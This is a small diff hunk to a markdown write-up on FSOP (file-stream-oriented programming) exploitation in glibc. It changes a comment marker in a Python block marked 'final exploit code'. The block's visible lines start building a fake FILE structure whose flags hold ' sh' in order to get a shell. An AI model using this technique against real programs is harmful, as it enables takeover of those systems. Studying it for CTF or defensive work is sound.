@@ -8,7 +8,7 @@ There are many ways to perform an fsop, the modern and most reliable way is to u
 
 ## How it works
 ```python
-// final exploit code
+# final exploit code
 fs = FileStructure()
 fs.flags = b' sh\0\0\0\0\0'
 fs._lock = libc.sym._IO_stdfile_1_lock
